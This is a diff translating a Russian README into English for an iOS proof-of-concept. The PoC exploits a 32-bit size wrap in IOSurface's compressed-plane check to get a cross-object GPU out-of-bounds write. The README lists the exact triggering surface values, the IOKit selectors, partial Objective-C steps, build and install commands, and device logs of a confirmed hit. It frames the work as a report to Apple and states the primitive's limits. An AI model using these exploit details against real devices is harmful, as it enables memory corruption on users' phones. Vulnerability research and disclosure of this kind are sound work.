@@ -1,83 +1,82 @@
 # F1OOB-PoC — IOSurface F1 wrap → GPU cross-object OOB write
 
-> Статус: **PoC harness + подтверждённый примитив на 27.2 / 24B115 (iPhone14,7, T8110)**.
-> Это **не kernel R/W** и не root. Примитив живёт в GPU-контексте приложения.
+> Status: **PoC harness + confirmed primitive on iOS 27.2 / 24B115 (iPhone14,7, T8110)**.
+> This is **not kernel R/W** and not root. The primitive lives inside the app's GPU context.
 
 ---
 
-## 1. Что за баг
+## 1. The bug
 
-В `IOSurface.kext` (27.2, 24B115) парсер сжатых плоскостей считает суммарный
-размер multi-slice compressed plane в 32-битной арифметике:
+In `IOSurface.kext` (27.2, 24B115), the compressed-plane parser computes the total
+multi-slice compressed-plane size in 32-bit arithmetic:
 
 ```c
-// FUN_fffffff009c1af14, строки 1353-1363 (декомпиляция)
+// FUN_fffffff009c1af14, lines 1353-1363 (decompiled)
 if (planeSize <
     (uint)((dataRegionBytesPerSlice + headerRegionBytesPerSlice) * sliceCount)) {
     reject;
 }
 ```
 
-Оба слагаемых и произведение — `uint`/`int`, поэтому проверка выполняется
-по модулю 2^32. Форма:
+Both addends and the product are `uint`/`int`, so the check is performed modulo 2^32.
+The following shape:
 
 ```
-IOSurfacePlaneSize                    = 0x10000
-IOSurfaceAllocSize                    = 0x10000
-IOSurfaceSliceCount                   = 4
-IOSurfacePlaneDataRegionBytesPerSlice = 0x4000
-IOSurfacePlaneHeaderRegionBytesPerSlice = 0x40000000
+IOSurfacePlaneSize                       = 0x10000
+IOSurfaceAllocSize                       = 0x10000
+IOSurfaceSliceCount                      = 4
+IOSurfacePlaneDataRegionBytesPerSlice    = 0x4000
+IOSurfacePlaneHeaderRegionBytesPerSlice  = 0x40000000
 ```
 
-даёт:
+produces:
 
 ```
-data + header          = 0x40004000
-(data + header) * 4    = 0x1_0001_0000   // истинный размер 4 GiB + 64 KiB
-32-bit truncation      = 0x00010000      // 64 KiB
-planeSize (0x10000) < 0x10000 == false    // проверка проходит
+data + header        = 0x40004000
+(data + header) * 4  = 0x1_0001_0000   // true size: 4 GiB + 64 KiB
+32-bit truncation    = 0x00010000      // 64 KiB
+planeSize (0x10000) < 0x10000 == false // check passes
 ```
 
-То есть ядро принимает поверхность, у которой заявленный logical region
-**4 GiB + 64 KiB**, а реально выделено **64 KiB**. Дальше этот размер
-потребляет GPU-путь (`AGX`/`IOGPU`), и там возникает несоответствие
-VA-диапазона и реального allocation.
+The kernel accepts a surface whose declared logical region is **4 GiB + 64 KiB**
+while the real allocation is **64 KiB**. The GPU path (`AGX`/`IOGPU`) consumes that
+size, which creates a mismatch between the GPU VA range and the real allocation.
 
 ---
 
-## 2. Что происходит на GPU-стороне
+## 2. What happens on the GPU side
 
-1. Поверхность создаётся через `IOSurfaceRoot` selector 0 (in-band XML).
-2. Приложение открывает `AGXAcceleratorG14P` type 1 и вызывает selector 8
-   с типом `0x82` и ID поверхности.
-3. AGX создаёт GPU-ресурс. В output:
+1. The surface is created through `IOSurfaceRoot` selector 0 (in-band XML).
+2. The app opens `AGXAcceleratorG14P` type 1 and calls selector 8 with type `0x82`
+   and the surface ID.
+3. AGX creates a GPU resource. The output contains:
 
 ```
-out+0x00 = GPU VA ресурса      (например 0x1500000000)
-out+0x28 = заявленный span     (в favorable state — 0x1000000 / 16 MiB,
-                                в fresh state — 0x10000 / 64 KiB)
+out+0x00 = resource GPU VA       (e.g. 0x1500000000)
+out+0x28 = declared span         (0x1000000 / 16 MiB in a favorable state,
+                                  0x10000 / 64 KiB in a fresh state)
 ```
 
-4. Приложение оборачивает 64 KiB IOSurface в `MTLBuffer` через
-   `newBufferWithBytesNoCopy:length:0x10000`. `gpuAddress` этого буфера
-   совпадает с `out+0x00`.
-5. GPU page table — **per-context**. Следующие `MTLBuffer`-ы получают GPU VA
-   рядом с F1-буфером. Shader-аргумент `device uint *buf` — это просто
-   GPU VA; Metal не вставляет bounds-check на каждое обращение.
-6. Если посчитать `victim.gpuAddress - f1.gpuAddress` и записать через
-   F1-буфер по этому индексу, запись уходит в **чужой Metal-буфер**,
-   если его PTE замаплен в этом контексте.
+4. The app wraps the 64 KiB IOSurface in a 64 KiB `MTLBuffer` via
+   `newBufferWithBytesNoCopy:length:0x10000`. The buffer's `gpuAddress` matches
+   `out+0x00`.
+5. The GPU page table is **per-context**. Subsequent `MTLBuffer`s receive GPU VAs
+   close to the F1 buffer. A shader's `device uint *buf` is a raw GPU VA; Metal does
+   not insert a bounds check on every access.
+6. If you compute `victim.gpuAddress - f1.gpuAddress` and write through the F1 buffer
+   at that index, the write lands in the **other Metal buffer** when its PTE is mapped
+   in the same context.
 
-Именно это и есть cross-object GPU OOB write: не «16 MiB физической памяти»,
-а **коллизия GPU VA** внутри одного процесса/контекста.
+That is the cross-object GPU OOB write: not “16 MiB of physical memory”, but a
+**GPU VA collision** inside one process/context.
 
 ---
 
-## 3. Код PoC
+## 3. PoC code
 
-Файл: `main.m`.
+File: `main.m`.
 
-Ключевые шаги:
+Key steps:
 
 ```objc
 // 1. F1 surface via IOSurfaceRoot sel0
@@ -115,30 +114,30 @@ if (back == marker) {
 }
 ```
 
-Дополнительно PoC делает reference-тест фиксированного `+0x20000` и
-логирует, backed ли эта страница в текущем запуске. Фиксированный offset
-**не портативен**; цель должна выбираться по runtime `gpuAddress`.
+The PoC also performs a reference test at a fixed `+0x20000` offset and logs whether
+that page is backed in the current run. Fixed offsets are **not portable**; targets
+must be selected by runtime `gpuAddress`.
 
 ---
 
-## 4. Сборка, подпись, запуск
+## 4. Build, sign, run
 
-Theos не поддерживает пробелы в пути, поэтому собирать нужно в каталоге
-без пробелов:
+Theos does not support spaces in the project path, so build from a path without
+spaces:
 
 ```bash
 cd /home/femboychik/asuka4scape/02_KERNEL/f1_poc
 make clean && make ipa
 ```
 
-Подпись:
+Sign:
 
 ```bash
 zsign -k cert.p12 -p <pass> -m profile.mobileprovision \
       -o F1OOB-PoC-signed.ipa F1OOB-PoC.ipa
 ```
 
-Установка/запуск:
+Install and run:
 
 ```bash
 pymobiledevice3 apps install F1OOB-PoC-signed.ipa
@@ -146,7 +145,7 @@ pymobiledevice3 developer core-device launch-application --kill-existing \
   app.lake9674.aquila8809
 ```
 
-Лог на устройстве:
+Logs on device:
 
 ```
 Documents/F1OOB-PoC/latest.log
@@ -155,9 +154,9 @@ Documents/F1OOB-PoC/run-YYYYMMDD-HHMMSS.log
 
 ---
 
-## 5. Что видно в логах
+## 5. Observed logs
 
-### 5.1. Подтверждённый cross-object hit (F1Probe, 27.2 / 24B115)
+### 5.1. Confirmed cross-object hit (F1Probe, 27.2 / 24B115)
 
 ```
 [METAL] gpuAddress=0x1500000000
@@ -167,12 +166,12 @@ Documents/F1OOB-PoC/run-YYYYMMDD-HHMMSS.log
 [XOBJ] *** CROSS-OBJECT HIT ctrl off=0x0 ***
 ```
 
-То есть запись через F1-буфер на `+0x100000` реально меняет содержимое
-отдельного `MTLBuffer`.
+A write through the F1 buffer at `+0x100000` changes the contents of a separate
+`MTLBuffer`.
 
-### 5.2. Свежие запуски PoC (текущее состояние устройства)
+### 5.2. Fresh PoC runs (current device state)
 
-С 15 filler-буферами victim попадает на `+0x180000`:
+With 15 filler buffers the victim lands at `+0x180000`:
 
 ```
 [AGX] sel8=0x0 gpuVA=0x1500000000 span=0x10000
@@ -183,7 +182,7 @@ Documents/F1OOB-PoC/run-YYYYMMDD-HHMMSS.log
 [METAL] no cross-object hit
 ```
 
-С 6 filler-буферами victim попадает на `+0xA8000` — всё ещё нет hit:
+With 6 filler buffers the victim lands at `+0xA8000`, still no hit:
 
 ```
 [METAL] victim MTLBuffer=... gpuAddress=0x15000a8000
@@ -192,69 +191,61 @@ Documents/F1OOB-PoC/run-YYYYMMDD-HHMMSS.log
 [METAL] no cross-object hit
 ```
 
-Это важный отрицательный результат: **16 MiB span/VA reservation не
-воспроизводится детерминированно**. В favorable state (как в старых
-прогонах F1Probe) AGX/VA allocator резервирует большой диапазон, и
-cross-object hit работает на `+0x100000`. В fresh state тот же самый XML
-даёт 64 KiB, и victim уже вне досягаемости.
+This is an important negative result: **the 16 MiB span/VA reservation is not
+deterministic**. In a favorable state (older F1Probe runs) the AGX/VA allocator
+reserves a large range and the cross-object hit works at `+0x100000`. In a fresh
+state the same XML yields 64 KiB and the victim is out of reach.
 
-Причина — state-dependent поведение AGX resource/VA allocator на этом
-билде (первое мапление, кэш/резервация), а не разница в XML. XML в PoC
-и в F1Probe **побайтово одинаковый** (1750 байт + NUL, sum `0x854b747c`).
-Поэтому PoC — это harness: он логирует все адреса/span и выполняет
-cross-object запись, но hit зависит от состояния AGX VA reservation.
-
----
-
-## 6. Границы примитива
-
-- **Same process / same GPU context.** Чужие процессы, ядро и SPTM
-  в этот GPU VA не замаплены.
-- **Не kernel R/W.** Запись идёт через GPU page table в GPU-страницы,
-  а не в CPU page tables.
-- **Нет page table/TTBAT в окне.** Полный скан 16 MiB показал только
-  Metal-шейдеры и reciprocal-таблицы; page table/TTBAT там нет.
-- **Фиксированные offset нестабильны.** Работает только target по
-  runtime `gpuAddress`.
-- **Span/VA reservation нестабильны.** PoC — harness; для стабильного
-  hit нужен grooming/состояние, при котором AGX резервирует большой
-  диапазон.
+The cause is state-dependent AGX resource/VA allocator behavior on this build
+(first mapping, cache/reservation), not a difference in the XML. The XML in the PoC
+and in F1Probe is **byte-for-byte identical** (1750 bytes + NUL, sum `0x854b747c`).
+The PoC is therefore a harness: it logs all addresses/span and attempts the
+cross-object write, but the hit depends on the AGX VA reservation state.
 
 ---
 
-## 7. Что это даёт для Apple
+## 6. Primitive boundaries
 
-Это memory-safety баг в цепочке:
+- **Same process / same GPU context.** Other processes, the kernel, and SPTM are not
+  mapped into this GPU VA.
+- **Not kernel R/W.** The write goes through the GPU page table into GPU pages, not
+  into CPU page tables.
+- **No page table/TTBAT in the window.** A full 16 MiB scan found only Metal shaders
+  and reciprocal tables; no page table/TTBAT.
+- **Fixed offsets are unstable.** Only runtime `gpuAddress` targeting works.
+- **Span/VA reservation is unstable.** The PoC is a harness; a stable hit needs
+  grooming/state in which AGX reserves a large range.
+
+---
+
+## 7. Value for Apple
+
+This is a memory-safety bug in the chain:
 
 ```
 sandboxed app
   -> IOSurface compressed-plane 32-bit wrap (F1)
-  -> kernel accepts 4 GiB + 64 KiB logical region for 64 KiB allocation
+  -> kernel accepts 4 GiB + 64 KiB logical region for a 64 KiB allocation
   -> AGX/Metal resource VA mismatch
   -> cross-object GPU OOB write inside the app's GPU context
 ```
 
-Для отчёта нужно приложить:
+A report should include:
 
-1. F1 XML и точные поля.
-2. Лог `sel0` (parser accepted) и AGX `out+0x00/out+0x28`.
-3. Лог cross-object hit по `gpuAddress` (F1Probe).
-4. Указание, что primitive same-context, не kernel R/W.
+1. The F1 XML and exact fields.
+2. The `sel0` log (parser accepted) and AGX `out+0x00/out+0x28`.
+3. The cross-object hit log by `gpuAddress` (F1Probe).
+4. A clear statement that the primitive is same-context, not kernel R/W.
 
 ---
 
-## 8. Файлы
+## 8. Files
 
 ```
 main.m              — PoC
 Makefile            — Theos build
 Info.plist          — bundle app.lake9674.aquila8809
 entitlements.plist  — empty
-README.md           — этот файл
-```
-
-Успешный лог F1Probe:
-
-```
-evidence/f1-XOBJ-20261106-171110.log
+README.md           — this file
+evidence/           — F1Probe cross-object hit log
 ```
